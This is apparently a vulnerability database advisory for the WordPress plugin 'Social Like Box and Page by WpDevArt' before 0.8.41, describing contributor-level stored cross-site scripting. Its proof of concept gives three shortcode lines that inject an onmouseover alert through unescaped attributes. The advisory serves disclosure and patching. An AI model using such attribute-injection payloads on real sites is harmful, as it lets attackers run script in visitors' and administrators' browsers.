## WordPress Plugin Vulnerabilities

# Social Like Box and Page by WpDevArt < 0.8.41 - Contributor+ Stored XSS

### Description

The plugin does not validate and escape some of its shortcode attributes before outputting them back in a page/post where the shortcode is embed, which could allow users with the contributor role and above to perform Stored Cross-Site Scripting attacks.

### Proof of Concept

[wpdevart\_like\_box height='" onmouseover="alert(/XSS-1/)"']
[wpdevart\_like\_box border\_color='" onmouseover="alert(/XSS-2/)//']
[wpdevart\_like\_box locale='" onmouseover="alert(/XSS-3/)//']
